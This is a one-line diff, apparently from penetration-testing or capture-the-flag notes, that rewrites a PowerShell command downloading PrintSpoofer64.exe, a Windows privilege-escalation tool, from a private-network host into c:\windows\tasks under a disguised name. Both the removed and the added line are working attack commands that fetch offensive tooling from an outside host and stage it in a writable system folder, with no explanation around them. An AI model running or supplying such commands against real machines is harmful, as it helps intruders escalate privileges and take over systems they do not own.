@@ -1,1 +1,1 @@
-powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.0.0.1/tools/PrintSpoofer64.exe','c:\windows\\tasks\print.exe')
+powershell -c "iwr -Uri 'http://10.2.2.231/tools/PrintSpoofer64.exe' -OutFile 'c:\windows\tasks\print.exe' -TimeoutSec 300"
